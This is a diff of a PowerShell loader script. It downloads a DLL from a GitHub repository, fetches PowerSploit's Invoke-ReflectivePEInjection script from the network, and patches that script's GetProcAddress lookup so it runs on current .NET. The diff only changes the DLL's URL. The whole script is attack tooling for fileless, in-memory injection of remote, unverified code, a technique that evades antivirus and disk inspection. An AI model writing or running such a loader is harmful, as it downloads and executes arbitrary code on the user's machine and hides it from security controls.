@@ -1,5 +1,5 @@
 [Console]::Clear()
-$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"
+$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1.dll"
 $dllBytes = (iwr -UseBasicParsing $dllUrl).Content
 $ps1 = (iwr -UseBasicParsing "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
 $ps1 = $ps1 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
